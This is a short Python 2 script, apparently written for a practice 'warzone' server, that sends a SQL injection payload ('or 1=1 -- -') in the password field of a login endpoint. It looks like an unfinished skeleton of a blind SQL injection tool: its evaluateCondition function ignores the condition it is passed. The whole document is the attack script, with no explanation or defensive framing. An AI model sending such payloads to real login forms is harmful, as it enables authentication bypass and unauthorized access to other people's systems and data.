#!/usr/bin/python

import requests
import sys

BASEURL = "http://warzone.wsg127.com:5001/sql3?username=guest&password=guest"

SESSION = requests.Session()

def PostURL(url, data):
    return SESSION.post(format(url), data)

def evaluateCondition(cond):
    payload = "or 1=1 -- -"
    response = PostURL(BASEURL, { "password" : payload})

    print response

evaluateCondition(sys.argv[1])
